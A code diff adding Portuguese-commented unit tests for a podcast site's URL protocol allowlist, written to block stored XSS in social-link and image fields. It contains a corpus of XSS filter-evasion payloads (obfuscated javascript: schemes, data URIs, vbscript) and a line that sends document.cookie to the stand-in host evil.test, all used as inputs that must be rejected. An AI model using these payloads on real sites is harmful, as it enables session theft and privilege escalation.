@@ -35,6 +35,7 @@ import {
   eventTypeSchema,
   imageRefSchema,
   isImageRef,
+  isSafeHttpUrl,
   isSpotifyUrl,
   isYoutubeUrl,
   loginSchema,
@@ -49,14 +50,17 @@ import {
   podcastStatusSchema,
   podcastUpdateSchema,
   resolvePodcastRuleState,
+  SAFE_URL_PROTOCOLS,
   sessionSchema,
   siteConfigUpdateSchema,
+  socialLinksSchema,
   testimonialCreateSchema,
   toAdminPodcast,
   toPublicEpisode,
   toPublicPodcast,
   toPublicPodcastWithEpisodes,
   uploadRequestSchema,
+  urlSchema,
   validateEpisodeTracks,
   validatePodcastRules,
   visualStyleSchema,
@@ -330,6 +334,126 @@ describe('imageRefSchema', () => {
     ).toBe(false);
     expect(
       episodeCreateSchema.safeParse({ ...validEpisode(), youtubeUrl: '/videos/abc' }).success,
+    ).toBe(false);
+  });
+});
+
+/* -------------------------------------------------------------------------- */
+/* SEGURANÇA — allowlist de protocolo (DEC-022, XSS armazenado)               */
+/* -------------------------------------------------------------------------- */
+
+/**
+ * `z.string().url()` valida SINTAXE de URI, não protocolo: `javascript:alert(1)`
+ * é URI válida e passava. Como `socialLinks` vira `href`, isso era XSS
+ * armazenado com escalação EDITOR -> ADMIN. Corpus de evasão abaixo: caso
+ * alguém volte a usar `z.string().url()` cru, estes testes ficam vermelhos.
+ */
+const TAB = String.fromCharCode(9);
+const LF = String.fromCharCode(10);
+const CR = String.fromCharCode(13);
+const NUL = String.fromCharCode(0);
+
+const URL_EVASIONS: [string, string][] = [
+  ['javascript:alert(1)', 'esquema javascript'],
+  ['JAVASCRIPT:alert(1)', 'maiusculas'],
+  ['JaVaScRiPt:alert(1)', 'maiusculas alternadas'],
+  [`java${TAB}script:alert(1)`, 'tab no meio'],
+  [`java${LF}script:alert(1)`, 'newline no meio'],
+  [`java${CR}script:alert(1)`, 'carriage return no meio'],
+  [' javascript:alert(1)', 'espaco a frente'],
+  [`${TAB}javascript:alert(1)`, 'tab a frente'],
+  [`${LF}javascript:alert(1)`, 'newline a frente'],
+  [`javascript${NUL}:alert(1)`, 'null byte'],
+  ['javascript&colon;alert(1)', 'entidade HTML nomeada'],
+  ['javascript&#58;alert(1)', 'entidade HTML numerica'],
+  ['data:text/html,<script>alert(1)</script>', 'data URI'],
+  ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data URI base64'],
+  ['vbscript:msgbox(1)', 'vbscript'],
+  ['VBScript:msgbox(1)', 'vbscript maiusculo'],
+  ['file:///etc/passwd', 'file'],
+  ['blob:https://evil.test/uuid', 'blob'],
+  ['about:blank', 'about'],
+  ['ftp://host/x', 'ftp'],
+  ['https://user:senha@evil.test/', 'credenciais embutidas disfarcando o host'],
+  ['//evil.test/x', 'protocol-relative'],
+  ['javascript://%0aalert(1)', 'comentario com newline codificada'],
+];
+
+describe('urlSchema — allowlist de protocolo', () => {
+  it.each(URL_EVASIONS)('rejeita %s (%s)', (value) => {
+    expect(urlSchema.safeParse(value).success).toBe(false);
+    expect(isSafeHttpUrl(value)).toBe(false);
+  });
+
+  it.each([
+    'https://instagram.com/reiners',
+    'http://localhost:3000/images/capa.png',
+    'https://cdn.reiners.media/podcasts/capa.jpg?v=2',
+    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+  ])('aceita a URL legitima %s', (value) => {
+    expect(urlSchema.safeParse(value).success).toBe(true);
+    expect(isSafeHttpUrl(value)).toBe(true);
+  });
+
+  it('so http e https estao na allowlist', () => {
+    expect([...SAFE_URL_PROTOCOLS]).toEqual(['http:', 'https:']);
+  });
+});
+
+describe('imageRefSchema — o ramo absoluto tambem esta preso a http/https', () => {
+  it.each(URL_EVASIONS)('rejeita %s (%s)', (value) => {
+    expect(imageRefSchema.safeParse(value).success).toBe(false);
+  });
+
+  it('caminho root-relativo com @ continua valido (nao e credencial)', () => {
+    expect(imageRefSchema.safeParse('/images/@2x/logo.png').success).toBe(true);
+  });
+});
+
+describe('cadeia de ataque do achado de seguranca', () => {
+  it('POST /api/podcasts com socialLinks hostil e recusado na escrita', () => {
+    const hostile = "javascript:fetch('https://evil.test/'+document.cookie)";
+    const result = podcastCreateSchema.safeParse({
+      ...validPodcast(),
+      socialLinks: { instagram: hostile },
+    });
+    expect(result.success).toBe(false);
+    if (!result.success) {
+      expect(result.error.issues.some((issue) => issue.path.includes('instagram'))).toBe(true);
+    }
+  });
+
+  it('PATCH /api/podcasts nao consegue injetar depois', () => {
+    expect(
+      podcastUpdateSchema.safeParse({ socialLinks: { twitter: 'javascript:alert(1)' } }).success,
+    ).toBe(false);
+  });
+
+  it('nenhum campo de socialLinks aceita esquema perigoso', () => {
+    for (const field of ['instagram', 'twitter', 'tiktok', 'linkedin', 'website', 'github']) {
+      expect(
+        socialLinksSchema.safeParse({ [field]: 'javascript:alert(1)' }).success,
+        field,
+      ).toBe(false);
+    }
+  });
+
+  it('as trilhas do episodio tambem nao aceitam esquema perigoso', () => {
+    for (const field of ['youtubeUrl', 'spotifyUrl']) {
+      expect(
+        episodeCreateSchema.safeParse({ ...validEpisode(), [field]: 'javascript:alert(1)' }).success,
+        field,
+      ).toBe(false);
+    }
+  });
+
+  it('os campos de imagem tambem nao aceitam esquema perigoso', () => {
+    expect(
+      podcastCreateSchema.safeParse({ ...validPodcast(), coverImage: 'javascript:alert(1)' })
+        .success,
+    ).toBe(false);
+    expect(
+      siteConfigUpdateSchema.safeParse({ logoUrl: 'javascript:alert(1)' }).success,
     ).toBe(false);
   });
 });
